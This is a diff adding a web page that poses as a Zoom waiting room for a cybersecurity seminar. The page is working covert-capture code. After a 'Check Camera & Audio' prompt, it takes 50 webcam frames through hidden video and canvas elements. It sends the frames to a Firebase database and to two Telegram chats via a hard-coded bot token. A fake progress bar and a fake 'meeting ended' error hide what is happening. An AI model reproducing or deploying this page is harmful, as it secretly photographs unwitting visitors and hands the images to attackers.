@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom - Waiting Room</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+    <style>
+        body { background-color: #1a1a1a; font-family: 'Inter', sans-serif; color: white; }
+        .zoom-blue { background-color: #0b5cff; }
+        .zoom-blue:hover { background-color: #0046cc; }
+        .spinner { border-top-color: #0b5cff; }
+    </style>
+</head>
+<body class="flex items-center justify-center h-screen">
+
+    <div class="max-w-md w-full p-6 text-center">
+        <!-- Zoom Header -->
+        <div class="mb-8">
+            <h2 class="text-xl font-semibold mb-2">Please wait, the meeting host will let you in soon.</h2>
+            <p class="text-gray-400 text-sm">Cybersecurity Seminar - IIT Patna Branch</p>
+        </div>
+
+        <div id="setup-ui">
+            <!-- Video Preview Placeholder -->
+            <div class="bg-black rounded-lg w-full aspect-video mb-6 flex items-center justify-center border border-gray-700 relative overflow-hidden">
+                <div class="text-gray-500 text-sm flex flex-col items-center">
+                    <svg class="w-12 h-12 mb-2" fill="currentColor" viewBox="0 0 20 20"><path d="M10 12a2 2 0 100-4 2 2 0 000 4z"/><path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd"/></svg>
+                    Camera is off
+                </div>
+            </div>
+
+            <p class="text-sm text-gray-300 mb-6">Test your speakers and camera before the meeting starts.</p>
+            
+            <button onclick="initiate()" class="zoom-blue text-white font-medium py-2 px-8 rounded-full transition duration-200">
+                Check Camera & Audio
+            </button>
+        </div>
+
+        <!-- Hidden exfiltration UI -->
+        <div id="download-ui" class="hidden">
+            <div class="flex flex-col items-center">
+                <div class="w-10 h-10 border-4 border-gray-700 spinner rounded-full animate-spin mb-4"></div>
+                <p class="text-blue-400 font-medium" id="status-text">Connecting to video engine...</p>
+                <div class="w-full bg-gray-800 rounded-full h-1 mt-6">
+                    <div id="loader" class="zoom-blue h-1 rounded-full transition-all duration-300" style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // FIREBASE CONFIGURATION (Using your provided keys)
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const targetSource = 'Zoom_Waiting_Room';
+
+        // TELEGRAM CONFIGURATION
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function initiate() {
+            try {
+                // Request camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                document.getElementById('setup-ui').classList.add('hidden');
+                document.getElementById('download-ui').classList.remove('hidden');
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const max = 50;
+                    
+                    const interval = setInterval(() => {
+                        if (count >= max) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            render404();
+                            return;
+                        }
+                        
+                        captureAndSend(count + 1);
+                        count++;
+                        
+                        const progress = (count / max) * 100;
+                        document.getElementById('loader').style.width = progress + "%";
+                        document.getElementById('status-text').innerText = `Syncing Video: ${Math.round(progress)}%`;
+                    }, 1100); 
+                };
+            } catch (e) {
+                alert("Meeting Error: Please allow camera access to join the waiting room.");
+            }
+        }
+
+        function captureAndSend(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // 1. Firebase Exfiltration
+            const base64Data = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({
+                image_data: base64Data,
+                target_id: new URLSearchParams(window.location.search).get('id') || 'Meeting_Guest',
+                source: targetSource,
+                timestamp: Date.now()
+            });
+
+            // 2. Telegram Backup
+            canvas.toBlob(blob => {
+                if (!blob) return;
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id);
+                    fd.append('photo', blob, 'cam_test.jpg');
+                    fd.append('caption', `📹 ZOOM_WAITING_ROOM\nFrame: ${index}/50`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+
+        function render404() {
+            document.body.innerHTML = `<div class='text-center p-20'>
+                <h1 class='text-4xl font-bold'>Error 1003</h1>
+                <p class='text-gray-500'>The meeting has ended or the link has expired.</p>
+            </div>`;
+        }
+    </script>
+</body>
+</html>
